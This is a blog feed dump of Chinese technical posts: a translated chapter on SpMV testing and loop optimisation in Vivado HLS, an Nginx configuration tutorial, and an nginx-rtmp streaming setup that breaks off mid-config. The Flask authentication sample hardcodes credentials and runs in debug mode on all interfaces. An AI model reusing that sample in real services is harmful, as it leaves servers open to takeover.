一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。 这个测试平台相对简单并且可能无法充分验证所有的输入都能正常输出。最主要的原因是，它仅仅只用了一个矩阵作为例子，相反，一个好的激励会测试许多矩阵。通常，会通过随机的方式产生输入的测试用例，并且重点测试边界用例。在这个例子中，我们不仅要保证值正确计算，同时保证通过加速器正确的被执行了，而且编译时间相关的parameter改变会在实现不同加速单元值折中。最关键的是，在相同的parameter上，我们能通过随机产生很多输入数据来进行测试。编译时间相关的参数每次发生变化，都需要我们重新编译代码。 创建一个复杂的激励来，通过随机数方式生成许多组测试数据。稀疏矩阵编译时间参数应该是可以修改的（例如，SIZE，NNZ 等）。创建一个HLS综合脚本，在编译时间参数合理范围改变时，能执行代码很多次。 6.4 指定循环的属性如果直接将上述代码进行综合，我们可以得到函数运行的时钟周期及资源占用率。但是，我们不能得到模块执行所需的时钟周期、任务执行的延迟和任务执行之间的间隔。因为这些都取依赖于输入数据，由spmv函数外部因素决定。最主要的因素是，内层循环执行的次数是由矩阵M中非0元素个数决定的。非0元素的个数在代码中是由常量NNZ决定的，虽然可以调用函数计算不同大小的矩阵，但是实际迭代次数是和输入数据相关的。另外，性能也会因为非0元素的分布、综合优化的约束产生不同。更复杂的是，迭代的次数由输入决定，许多可能的输入并没有被遍历。所以，对于工具而言，不通过复杂的分析和额外的信息，工具是不能知道spmv函数执行需要多少时钟周期。Vivado®HLS 工具也不能进行上述的分析。 spmv函数能正常工作的前提条件是什么？证明给定的前提条件，矩阵中每个非0元素实是不是在对应一次内层循的执行？ 有几种方式能帮助工具进行性能的分析，其中一种方式就是想Vivado®HLS提供循环边界的额外信息。这可以通过使用loop_tripcount directive实现，它能让设计者指定最小、最大和平均迭代次数针对特定的循环。通过提供这些值， Vivado®HLS 能提供时钟周期级别的评估。 使用loop_tripcount directive 用变量指定循环的最小，最大和平均迭代次数，这样Vivado®HLS 工具能对当前设计时钟周期数目进行估计。这些不影响最后综合的结果，只会影响综合报告。 对spmv函数使用loop_tripcount directive，语法格式 # pragma HLS loop_tripcount min=X, max=Y, avg=Z 其中X，Y，Z正的常量。哪个循环需要使用directive?当改变参数（min、max和avg）以后，综合报告有什么不同？这对时钟周期有影响吗？这对资源占用有影响吗？ loop_tripcount 引导能帮助设计者对函数的性能有个原始的估计。这样能比较相同的函数通过使用不同的directives或者对代码本身重构。但是，这不能确定min、max和 avg 参数。这也很难确定边界条件min和max的值。如果有测试平台，就有一种更准确的方式用于计算spmv函数执行的时钟周期数，那就是C/RTL协同仿真。 6.5 C/RTL 协同仿真C/RTL 协同仿真能自动化测试Vivado®HLS工具生成的RTL代码，只需要在综合的时候提供测试平台。每次执行综合以后的代码和提供的测试平台，记录输入和输出结果。输入的值按照时钟转换成输入向量。这里的输入向量用于针对生成的RTL代码进行仿真，同时记录输出向量。更新综合后的代码， 再次运行测试平台并保存输入和输出数据。测试平台如果返回值是0，则表示成功；若激励返回非0值，则表示失败。 C/RTL 协同仿真流程将VIvado®HLS 生成的RTL代码，通过C 测试平台，实现时钟周期级别的仿真。这样，就能准确对生成的RTL代码进行性能评估，即使性能与输入数据有关。被综合的函数运行周期最小值，最大值，平均值以及间隔在仿真完成以后都能准确的得到。 注意这些和时钟周期相关的参数是通过激励中测试数据得到的。所以，结果的质量和测试平台的质量息息相关。如果测试平台没有很好的对函数执行测试，那么结果将不准确。另外，输入测试向量都是基于理想的时序，不能反映模型实际工作时，外部接口对函数的影响。实际的性能可能会比仿真的要低，如果执行过程中阻塞在输入数据或对外部存储的访问上。不过，对于循环边界调试时变量的情况，设计者可以通过协同仿真的方式确定时钟周期个数。 C/RTL协同仿真能提供循环边界是变量的函数的延迟。它反馈函数运行时延迟的最小值、最大值和平均值以及函数运行间隔。这些延迟和测试平台输入的数据是强相关的。 图6.5 spmv函数内部循环流水执行过程和结构 当采用图6,4提供的测试平台时，函数运行的最小值、最大值和平均值以及函数间隔是多少个时钟周期？ 6.6 循环的优化与数组的分块我们可以通过Vivado®HLS 工具得到当前函数的性能和面积的评估结果，然后可以考虑如何对函数进行优化。流水线、循环展开、数组分块是第一类最常用的优化方法。最典型的方式是从最内层的循环，然后根据需要向外层循环进行。 在这个例子中， 对最内层的L2循环进行流水线化也许是我们最先和最容易想到的优化方式。这个连续迭代的循环在执行上流水以后，总体运行会加快。如果不采用流水，L2 循环将按照串行执行。注意，L1 循环此时还是按照串行的方式执行。 图6.5演示了spmv函数在L2循环采用流水方式时运行的步骤。每次L2的循环都被II=3I**I=3流水化。流水线允许在外层循环执行一次迭代时，内层循环执行多次循环迭代。此时，内层循环II受限于递归（recurrence ）操作。II=3I**I=3是因为我们认为加法器有3个时钟周期的延迟。外部循环没有采用流水的方式，所以内层的循环必须在下外层L2循环开始执行前，计算完成并输出结果。 对最内层的L2 for 循环进行流水化，通过在spmv函数中增加流水directive如图6.2所示。II(initiation interval)最后是多少？在你指定II的值以后，最终目标的II值是增大了还是减少了？ 观察执行步骤，我们可以发现有几个因素限制了循环执行性能。第一个因素，递归（recurrence ）操作限制了循环的 II。第二个因素，外层的循环没有采用流水的方式。一种高效计算稀疏矩阵向量乘法的方式，每个时钟周期把乘法器和加法器使用起来。当前的设计离这个目标还很远。 在章节4.3中，我们探究了几种设计优化技术，其中包括对不同的循环进行流水，循环展开，数组分割。掌握在这些技术之间进行权衡是一项挑战，因为它们之间经常相互依赖。我们通常联合使用这些技术，为了得到好的性能谨慎的选择其中一种而不选择另一种也许结果会更糟糕。例如，在我们使用循环展开是，设计者需要明白它对数据访问的影响。增加了对数据访问的操作但是设计性能又受限于数据访问时，优化毫无益处。同样，如果提供了冗余的存储端口，实际中使用率不高，这样对提高性能毫无帮助反而增加了资源的消耗。 仔细思考一下上述优化技术组合后复杂多变的样式，我们建议你尝试下面的练习： 对spmv设计进行综合，采用表6.1提供的10种directives，每种都有不同的流水，展开和分割针对不同的循环和数组。这些分割在不同的数组（values、columnIndex、x）上使用。你看到结果的趋势是如何的？增加了展开和分割，是有利于还是不利于面积？性能如何？为什么？ 表6.1 稀疏矩阵向量乘法可优化的方式 L1 L2 case1 - - case2 - pipeline case3 pipeline - case4 unroll=2 - case5 - pipeline,unroll=2 case6 - pipeline,unroll=2,cyclic=2 case7 - pipeline,unroll=4 case8 - pipeline,unroll=4,cyclic=4 case9 - pipeline,unroll=8 case10 - pipeline,unroll=8,cyclic=8 case11 - pipeline,unroll=8,block=8 如果你完成了上述练习，你会发现盲目的使用优化directives，可能不会得到你期望的结果。通常在设计时， 在思考下考虑应用的特性，选择针对设计的特定优化方式。当然，这也需要一些直觉能力和一些专用工具投入使用。虽然，搞清楚像Vivado®HLS这样复杂工具中每一个细节是困难乃至不可能的，但是我们能基于关键的方面建立思考模型。 上面我们在用例3和4中考虑对外层循环L1进行流水化操作而不是对内层循环。这种变化针对一个任务，可以提高潜在的并行程度。为了完成优化，Vivado®HLS 工具必须展开代码中所有的内层循环L2 。如果循环能全部展开，这样能减少计算循环边界的时间，同时也能消除递归（recurrences）。但是代码中的内层循环Vivado HLS是无法完全展开的，因为循环边界不是常量。 例如在实现上面提到的例子3，在最外层的循环L1使用流水化directive。在不设定目标II时，II值是多少？资源占用率发生了什么变化？增加了II后资源占用率结果如何？这与之前采对L2循环进行流水化，结果有什么不同？这和最基本的设计（无 directives）相比有什么不同？当你对外层循环进行展开时，结果到底如何？（提示：检查综合后的日志信息） 另外一种增加并行化的方式是对内层循环进行局部循环展开，就像之前例子5到10。这种变化实现更多的并行化，通过在相同的循环迭代中，执行更多的操作。有些情况，Vivado HLS 工具在对内层循环进行流水化时，通过实现更多操作来提高性能。但是，这还是很难提高内层循环的II，由于内层循环的递归操作。但是，在II大于1的情况下， 许多操作可以共享同一个计算单元。 图6.6展示了一个局部展开的代码。在这段代码中，L2 循环被分成2个循环，分别为L2_1和L2_2。最内层的循环L2_2执行的次数由参数S确定。内部循环包含了最原始的L2循环，其中循环边界是由最原始的L2循环确定的。代码中，L2_1 循环包含了不确定次数的乘法和加法操作，运算次数由参数S确定，和一次递归完成累加y0 += yty0+=y**t。 注意图6.6中的代码和自动循环展开的代码是由一点点区别的。自动循环展开复制计算，但是保留每次计算先后顺序（除了当前的例子）。这就导致了计算顺序由内层循环决定，如图6.7左所示。对计算顺序进行调整后，操作上的依赖关系如图6.7 左边所示。在当前的代码中，最后累加求和是一个递归（recurrence ）。当使用浮点数据类型时，这种调整计算顺序的操作可能对程序产生改变，所以Vivado HLS对这种类型的代码不进行操作顺序自动调整。 这个设计可能会被综合、实现如图6.8所示的结果。在这个例子中，S=3S=3与III**I最匹配，乘法器的延迟正好是3。所有的运算过程都是在一个乘法器和加法器上执行。比较这个例子与图6.5中的例子，我们可以发现一些缺点。最明显的是，内层循环的流水线长度很长，实现的时候需要多个更多的周期刷新流水线的输出，才能执行下一次外层L1循环。处理一行中非零元素和执行块S 相同。一行有个3个元素和一行有一个元素计算的时间是相同的。剩下的运算也需要在循环流水线中执行，即使他们的结果没有用。为了严格的比较两个设计的特性，我们需要了解设计对矩阵每行非零元素个数的预期。 12345678910111213141516171819202122#include "spmv.h"const static int S = 7;void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])&#123; L1: for (int i = 0; i &lt; NUM_ROWS; i++) &#123; DTYPE y0 = 0; L2_1: for (int k = rowPtr[i]; k &lt; rowPtr[i+1]; k += S) &#123;#pragma HLS pipeline II=S DTYPE yt = values[k] * x[columnIndex[k]]; L2_2: for(int j = 1; j &lt; S; j++) &#123; if(k+j &lt; rowPtr[i+1]) &#123; yt += values[k+j] * x[columnIndex[k+j]]; &#125; &#125; y0 += yt; &#125; y[i] = y0; &#125;&#125; 图6.6 局部展开图6.2中smpv函数 图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加 图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程 如果矩阵每行非零元素很少，则采用第一种实现方式较优；如果矩阵中每行非零元素较多，则第二种实现方式更好。 需要注意，这里存在一个关于先有鸡还是先有蛋的问题。我们需要知道目标器件和时钟周期，这样才能确定流水线中加法器能不能满足时序要求。只有在我们知道流水线的级数之后（也许S=1时，Vivado HLS才能识别到加法递归），我们才能选择合适版本的参数S，来满足II=1I**I=1。一旦我们确定了S，我们能通过C/RTL协同仿真来，通过一组测试数据，确定是不是达到了性能上的要求。因为循环边界是可变的，所以得到的性能参数是依赖于数据的，所以我们需要设定不同的S，来找到性能的最大值。改变器件的类型和工作频率会影响之前所有的设计！尽管看来去高层次综合（HLS）对解决问题提供的帮助不多，相比于RTL开发新版本然后进行验证，它开发起来快（代码编写方便）。 图6.8可以实现时，S 与加法器流水线等级相同。如果S设定较大，结果会怎样？如果S 设定较小，结果会怎样？如果目标II小于S会怎样？如果目标II大于S会怎样？ 6.7小结在本章节中，我们介绍了系数矩阵向量乘法（SpMV），这延续了之前对矩阵运算的研究。SpMV 显得很有趣，因为它采用了一种特别的数据结构。为了减少大量的存储，矩阵采用行压缩的方式存储，这样就要求我们以一种非直接的方式对矩阵进行访问。 这一章节首先我们了Vivado®HLS工具测试和仿真的能力。我们采用一个基于SpMV简单的激励文件，讲解HLS工作流程。另外，我们对Vivado®HLS工具中C/RTL 协同仿真进行了讲解。这对我们得到设计准确性能结果是十分重要。矩阵越不稀疏，则更多的计算需要执行。在测试平台确定以后，协同仿真可以提供程序运行的精确仿真。这样就可以达到执行周期和性能结果。最后，我们讨论了采用循环优化和数组分块对代码进行优化。 fpga并行编程]]></content>
      <categories>
        <category>SpMV</category>
      </categories>
      <tags>
        <tag>SpMV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx]]></title>
    <url>%2F2019%2F05%2F19%2FNginx%2F</url>
    <content type="text"><![CDATA[Nginx安装及配置 本文参考： Nginx安装配置_菜鸟教程 Nginx中文文档 Nginx简易教程 概述什么是nginx? Nginx (engine x) 是一款轻量级的Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。 什么是反向代理？ 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 安装与使用安装 nginx官网下载地址：http://nginx.org，发布版本分为 Linux 和 windows 版本。 也可以下载源码，编译后运行。 从源代码编译 Nginx 把源码解压缩之后，在终端里运行如下命令： 123$ ./configure$ make$ sudo make install 默认情况下，Nginx 会被安装在 /usr/local/nginx。通过设定编译选项，你可以改变这个设定。 Windows 安装 为了安装 Nginx / Win32，需先下载它(Nginx官方下载)。然后解压之，然后运行即可。下面以 C 盘根目录为例说明下： 1nginx-0.8.54 start nginx Nginx / Win32 是运行在一个控制台程序，而非 windows 服务方式的。服务器方式目前还是开发尝试中。 使用nginx 的使用比较简单，就是几条命令。 常用到的命令如下： nginx -s stop ：快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。 nginx -s quit ：平稳关闭Nginx，保存相关信息，有安排的结束web服务。 nginx -s reload ：因改变了Nginx相关配置，需要重新加载配置而重载。 nginx -s reopen ：重新打开日志文件。 nginx -c filename ：为 Nginx 指定一个配置文件，来代替缺省的。 nginx -t ：不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。 nginx -v：显示 nginx 的版本。 nginx -V：显示 nginx 的版本，编译器版本和配置参数。 如果不想每次都敲命令，可以在nginx安装目录下新添一个启动批处理文件startup.bat，双击即可运行。内容如下： 123456789101112@echo offrem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程nginx.exe -s stoprem 测试配置文件语法正确性nginx.exe -t -c conf/nginx.confrem 显示版本信息nginx.exe -vrem 按照指定配置去启动nginxnginx.exe -c conf/nginx.conf 如果是运行在 Linux 下，写一个 shell 脚本，大同小异。 配置nginx 配置实战我始终认为，各种开发工具的配置还是结合实战来讲述，会让人更易理解。 http反向代理配置我们先实现一个小目标：不考虑复杂的配置，仅仅是完成一个 http 反向代理。 nginx.conf 配置文件如下：注：conf / nginx.conf 是 nginx 的默认配置文件。你也可以使用 nginx -c 指定你的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#运行用户#user somebody;#启动进程,通常设置成和cpu的数量相等worker_processes 1;#全局错误日志error_log D:/Tools/nginx-1.10.1/logs/error.log;error_log D:/Tools/nginx-1.10.1/logs/notice.log notice;error_log D:/Tools/nginx-1.10.1/logs/info.log info;#PID文件，记录当前启动的nginx的进程IDpid D:/Tools/nginx-1.10.1/logs/nginx.pid;#工作模式及连接数上限events &#123; worker_connections 1024; #单个后台worker process进程的最大并发链接数&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型(邮件支持类型),类型由mime.types文件定义 include D:/Tools/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #设定日志 log_format main &apos;[$remote_addr] - [$remote_user] [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log D:/Tools/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用， #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime. sendfile on; #tcp_nopush on; #连接超时时间 keepalive_timeout 120; tcp_nodelay on; #gzip压缩开关 #gzip on; #设定实际的服务器列表 upstream zp_server1&#123; server 127.0.0.1:8089; &#125; #HTTP服务器 server &#123; #监听80端口，80端口是知名端口号，用于HTTP协议 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #首页 index index.html #指向webapp的目录 root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp; #编码格式 charset utf-8; #代理配置参数 proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #反向代理的路径（和upstream绑定），location 后面设置映射的路径 location / &#123; proxy_pass http://zp_server1; &#125; #静态文件，nginx自己处理 location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews; #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。 expires 30d; &#125; #设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic &quot;NginxStatus&quot;; auth_basic_user_file conf/htpasswd; &#125; #禁止访问 .htxxx 文件 location ~ /.ht &#123; deny all; &#125; #错误处理页面（可选择性配置） #error_page 404 /404.html; #error_page 500 502 503 504 /50x.html; #location = /50x.html &#123; # root html; #&#125; &#125;&#125; 好了，让我们来试试吧： 启动 webapp，注意启动绑定的端口要和nginx中的 upstream 设置的端口保持一致。 更改 host：在 C:WindowsSystem32driversetc 目录下的host文件中添加一条DNS 记录127.0.0.1 http://www.helloworld.com 启动前文中 startup.bat 的命令 在浏览器中访问 http://www.helloworld.com，不出意外，已经可以访问了。 负载均衡配置上一个例子中，代理仅仅指向一个服务器。 但是，网站在实际运营过程中，多半都是有多台服务器运行着同样的app，这时需要使用负载均衡来分流。 nginx也可以实现简单的负载均衡功能。 假设这样一个应用场景：将应用部署在 192.168.1.11:80、192.168.1.12:80、192.168.1.13:80 三台linux环境的服务器上。网站域名叫 http://www.helloworld.com，公网IP为 192.168.1.11。在公网IP所在的服务器上部署 nginx，对所有请求做负载均衡处理。 nginx.conf 配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #设定日志格式 access_log /var/log/nginx/access.log; #设定负载均衡的服务器列表 upstream load_balance_server &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; &#125; #HTTP服务器 server &#123; #侦听80端口 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #对所有请求进行负载均衡请求 location / &#123; root /root; #定义服务器的默认网站根目录位置 index index.html index.htm; #定义首页索引文件的名称 proxy_pass http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表 #以下是一些反向代理的配置(可选择性配置) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 &#125; &#125;&#125; 网站有多个webapp的配置当一个网站功能越来越丰富时，往往需要将一些功能相对独立的模块剥离出来，独立维护。这样的话，通常，会有多个 webapp。 举个例子：假如 http://www.helloworld.com 站点有好几个webapp，finance（金融）、product（产品）、admin（用户中心）。访问这些应用的方式通过上下文(context)来进行区分: http://www.helloworld.com/finance/ http://www.helloworld.com/product/ http://www.helloworld.com/admin/ 我们知道，http的默认端口号是80，如果在一台服务器上同时启动这3个 webapp 应用，都用80端口，肯定是不成的。所以，这三个应用需要分别绑定不同的端口号。 那么，问题来了，用户在实际访问 http://www.helloworld.com 站点时，访问不同 webapp，总不会还带着对应的端口号去访问吧。所以，你再次需要用到反向代理来做处理。 配置也不难，来看看怎么做吧： 1234567891011121314151617181920212223242526272829303132333435http &#123; #此处省略一些基本配置 upstream product_server&#123; server www.helloworld.com:8081; &#125; upstream admin_server&#123; server www.helloworld.com:8082; &#125; upstream finance_server&#123; server www.helloworld.com:8083; &#125; server &#123; #此处省略一些基本配置 #默认指向product的server location / &#123; proxy_pass http://product_server; &#125; location /product/&#123; proxy_pass http://product_server; &#125; location /admin/ &#123; proxy_pass http://admin_server; &#125; location /finance/ &#123; proxy_pass http://finance_server; &#125; &#125;&#125; https反向代理配置一些对安全性要求比较高的站点，可能会使用 HTTPS（一种使用ssl通信标准的安全HTTP协议）。 这里不科普 HTTP 协议和 SSL 标准。但是，使用 nginx 配置 https 需要知道几点： HTTPS 的固定端口号是 443，不同于 HTTP 的 80 端口 SSL 标准需要引入安全证书，所以在 nginx.conf 中你需要指定证书和它对应的 key 其他和 http 反向代理基本一样，只是在 Server 部分配置有些不同。 12345678910111213141516171819202122232425#HTTP服务器 server &#123; #监听443端口。443为知名端口号，主要用于HTTPS协议 listen 443 ssl; #定义使用www.xx.com访问 server_name www.helloworld.com; #ssl证书文件位置(常见证书文件格式为：crt/pem) ssl_certificate cert.pem; #ssl证书key位置 ssl_certificate_key cert.key; #ssl配置参数（选择性配置） ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #数字签名，此处使用MD5 ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / &#123; root /root; index index.html index.htm; &#125; &#125; 静态站点配置有时候，我们需要配置静态站点(即 html 文件和一堆静态资源)。 举例来说：如果所有的静态资源都放在了 /app/dist 目录下，我们只需要在 nginx.conf 中指定首页以及这个站点的 host 即可。 配置如下： 123456789101112131415161718192021222324252627worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server &#123; listen 80; server_name static.zp.cn; location / &#123; root /app/dist; index index.html; #转发任何请求到 index.html &#125; &#125;&#125; 然后，添加 HOST：127.0.0.1 http://static.zp.cn，此时，在本地浏览器访问 http://static.zp.cn ，就可以访问静态站点了。 跨域解决方案web 领域开发中，经常采用前后端分离模式。这种模式下，前端和后端分别是独立的 web 应用程序，例如：后端是 Java 程序，前端是 React 或 Vue 应用。 各自独立的 web app 在互相访问时，势必存在跨域问题。解决跨域问题一般有两种思路： CORS在后端服务器设置 HTTP 响应头，把你需要运行访问的域名加入加入 Access-Control-Allow-Origin 中。 jsonp把后端根据请求，构造json数据，并返回，前端用 jsonp 跨域。 这两种思路，本文不展开讨论。 需要说明的是，nginx 根据第一种思路，也提供了一种解决跨域的解决方案。 举例：http://www.helloworld.com 网站是由一个前端 app ，一个后端 app 组成的。前端端口号为 9000， 后端端口号为 8080。 前端和后端如果使用 http 进行交互时，请求会被拒绝，因为存在跨域问题。来看看，nginx 是怎么解决的吧： 首先，在 enable-cors.conf 文件中设置 cors ： 1234567891011121314151617181920212223242526# allow origin listset $ACAO &apos;*&apos;;# set single originif ($http_origin ~* (www.helloworld.com)$) &#123; set $ACAO $http_origin;&#125;if ($cors = &quot;trueget&quot;) &#123; add_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;; add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;; add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&apos;;&#125;if ($request_method = &apos;OPTIONS&apos;) &#123; set $cors &quot;$&#123;cors&#125;options&quot;;&#125;if ($request_method = &apos;GET&apos;) &#123; set $cors &quot;$&#123;cors&#125;get&quot;;&#125;if ($request_method = &apos;POST&apos;) &#123; set $cors &quot;$&#123;cors&#125;post&quot;;&#125; 接下来，在你的服务器中 include enable-cors.conf 来引入跨域配置： 12345678910111213141516171819202122232425262728# ----------------------------------------------------# 此文件为项目 nginx 配置片段# 可以直接在 nginx config 中 include（推荐）# 或者 copy 到现有 nginx 中，自行配置# www.helloworld.com 域名需配合 dns hosts 进行配置# 其中，api 开启了 cors，需配合本目录下另一份配置文件# ----------------------------------------------------upstream front_server&#123; server www.helloworld.com:9000;&#125;upstream api_server&#123; server www.helloworld.com:8080;&#125;server &#123; listen 80; server_name www.helloworld.com; location ~ ^/api/ &#123; include enable-cors.conf; proxy_pass http://api_server; rewrite &quot;^/api/(.*)$&quot; /$1 break; &#125; location ~ ^/ &#123; proxy_pass http://front_server; &#125;&#125;]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+rtmp]]></title>
    <url>%2F2019%2F05%2F17%2Fnginx-rtmp%2F</url>
    <content type="text"><![CDATA[nginx+rtmp 搭建视频直播服务器服务器安装配置 windows安装包(已编译好的版本)参考： nginx for windows windows下搭建基于nginx的rtmp服务器 在Windows下搭建基于nginx的视频直播和点播系统 搬运源码（未编译） Car-eye-RTMP-server(github) car-eye-http-flv-module nginx+rtmp在windows下编译 Windows下编译nginx-rtmp-module windows下编译nginx+nginx_rtmp_modue(vs2013) CentOS搭建nginx+rtmp服务器 nginx+rtmp直播流服务搭建 centos7 centos7 Nginx+rtmp 搭建流媒体服务器 linux下建议将nginx.conf中的http端口改为1024以上，好像是80端口每次运行都需要su权限。 Nginx搭建rtmp流媒体服务器 nginx服务器常用命令12345678910./nginx -v//查看nginx版本号./nginx -V //查看nginx详细的版本信息start ./nginx -c conf/nginx.conf //以nginx.conf的配置启动nginx./nginx -s stop//停止nginx服务器./nginx -s quit//停止nginx服务器./nginx -s reload//重启nginx服务器service nginx reload//重启nginx服务器./nginx -t (-c conf/nginx.conf)//检查配置文件是否正确./nginx -h//显示帮助信息./nginx -?//显示帮助信息 nginx+rtmp加入权限控制 本文参考： *rtmp-module官方wiki *视频直播点播nginx-rtmp开发手册中文版(参考wiki版本粗译) 如何给 nginx rtmp 服务加入鉴权机制(改源码) *「自己开发直播」实现nginx-rtmp-module多频道输入输出与权限控制 nginx-rtmp-module授权机制实现直播推流多房间授权认证 nginx-rtmp-module 权限控制 nginx-rtmp加入权限验证的简单方法 视频直播点播nginx-rtmp开发手册中文版 *nginx.conf中关于nginx-rtmp-module配置指令详解 *nginx-rtmp多房间和授权实现 *博客比较有用 nginx的rtmp-module默认不限制推流权限、播放权限。 想加入权限验证有很多种方法。 其中一个是改源码，一个是利用nginx+rtmp的配置文件调用后台接口进行验证。 第一种方法没成功过，第二种方法比较简单。此文介绍第二种方法，第一种方法可见博客-&gt;如何给 nginx rtmp 服务加入鉴权机制(改源码) 原理主要是利用on_publish跳转到当前配置的一个“location”，在这里进行验证。关键点在于rtmp application节点下面要配置“notify_method get;”为什么呢？因为跳转的时候，默认以POST方式传输参数，修改成GET方式，nginx配置里就可以轻松处理了。（当然nginx通过配置文件也可以处理post，只是复杂一些）。 我们在此使用python的后台框架flask处理on_publish的post请求。 后台返回http200即为通过验证，返回http500即为验证失败，服务器拒绝连接。 nginx的配置文件（位于nginx安装目录下：…/nginx/conf/nginx.conf）修改如下: 12345678910111213141516171819202122rtmp &#123; server &#123; #listen 1935; listen 10077; chunk_size 4000; application live &#123; live on; on_publish http://localhost:10078/user/auth;//后面的url即flask监听的地址 &#125; application hls &#123; live on; hls on; #hls_path ../nginx-1.7.11.3-Gryphon/html/hls; hls_path ../hls; hls_fragment 5s; on_publish http://localhost:10078/user/auth; &#125; &#125;&#125; python的flask后台代码如下： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding:utf-8 -*-#https://www.jianshu.com/p/0d14ae8f081c#https://blog.csdn.net/wei389083222/article/details/78721074/#https://blog.csdn.net/weixin_34368949/article/details/85991563#验证只能用post方法#虽然流密钥的格式像是get类型，但是必须使用POST获取参数。from flask import Flask, request, Responseapp = Flask(__name__)#传入url格式为: xx.xx.xx.xx:10078/user/auth?usr=xxx&amp;passWord=xxx@app.route('/user/auth',methods=['POST'])def auth(): usr = request.form['usr']#从url后获取的数据 passWord = request.form['passWord'] print(usr,'\t',passWord) #此处可改为从数据库获取数据 auth_user='abc' auth_passWord='123' if auth_user == usr and auth_passWord ==passWord: return Response(response='success',status=200)#返回200状态码 else: return Response(status=500)#返回500状态码 #Flask.abort(404) return passWordif __name__ == '__main__': app.run(host='0.0.0.0',port=10078,debug=True) 播放权限也可用类似on_publish的验证方法进行控制。 on_play和on_publish 一样，只接受post方法，若需要接受get方法需要在rtmp中application的配置中添加notify_method get;，然后可在http{}部分中处理调用（这部分语法我不太清楚，不详细展开）。 以下是nginx.conf关于on_play的用法 on_play语法：on_play url上下文：rtmp, server, application描述：设置 HTTP 播放回调。每次一个客户分发播放命令时，一个 HTTP 请求异步发送，命令处理会挂起 - 直到它返回结果码。之后再解析 HTTP 结果码。 HTTP 2XX 返回码的话继续 RTMP 会话。 HTTP 3XX 返回码的话 重定向 RTMP 到另一个流，这个流的名字在 HTTP 返回头的 Location 获取。如果新流的名字起始于 rtmp:// 然后远程 relay 会被创建。relay 要求 IP 地址是指定的而不是域名，并且只工作在 1.3.10 版本以上的 nginx。另请参考 notify_relay_redirect。 其他返回码的话 RTMP 连接丢弃。重定向例子： 123456789101112131415161718192021222324252627 http &#123; location /local_redirect &#123; rewrite ^.*$ 